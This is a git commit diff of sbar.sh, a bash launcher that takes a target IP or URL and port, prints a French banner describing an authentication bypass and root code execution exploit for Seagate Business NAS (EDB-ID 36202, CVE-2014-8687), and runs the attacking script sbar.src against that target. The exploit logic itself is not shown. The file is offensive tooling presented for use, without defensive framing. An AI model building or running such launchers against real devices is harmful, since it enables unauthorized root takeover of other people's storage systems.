0a70923c6e2c6dd086d50a00c8613be458940f86
dino213dz <h4ckr213dz@gmail.com>
2019-08-16 20:47:22 +0200

    Version 1.1 : Mise en forme et coloration. Amelioration du script python =>  Nouveau: redirection de la sortie erreur vers la sortie standard

--- sbar.sh
+++ sbar.sh
@@ -1,8 +1,48 @@
 #!/bin/bash
 
-if [ "$1" = "" ]; then
+cM="\033[1;33m"
+cT="\033[1;34m"
+cS="\033[1;34m"
+cR="\033[0m"
+
+
+
+if [ ${#1} -eq 0 ];then
 	echo "Usage: $0 [IP] [PORT]"
 	exit 0;
 fi
 
-python ./sbar.py $1 $2
+if [ ${#2} -eq 0 ];then
+	port=80 #8081
+else 
+	port=$2
+fi
+
+
+#format target
+target=$1
+target_starting_by=${target:0:5}
+slashes=$(echo $(echo $target|grep -o '/')|sed "s/ //g")
+nb_slashes=${#slashes}
+
+#http://target/uri/....
+#https://target/uri/....
+if [[ "$target_starting_by" =~ "http" ]] || [[ "$target_starting_by" =~ "ftp" ]] ;then
+	target=${target/*:\/\//}
+fi
+target=${target/\/*/}
+ip=$target
+
+echo -e "$cM[+] EXPLOIT:"
+echo -e "$cM |_[-] DETAILS:$cT Authentification Seagate Business NAS et execution de code en tant que root . $cR"
+echo -e "$cM |_[-] EDB-ID:$cT 36202 $cR"
+echo -e "$cM |_[-] CVE:$cT 2014-8687 $cR"
+echo -e "\n$cM[+] CIBLE $cR"
+echo -e "$cM |_[-] IP:$cT $ip $cR"
+echo -e "$cM |_[-] PORT:$cT $port $cR"
+
+echo -e "\n$cM[+] ATTAQUE $cM"
+python ./sbar.src $ip $port
+echo -e "$cR"
+
+exit
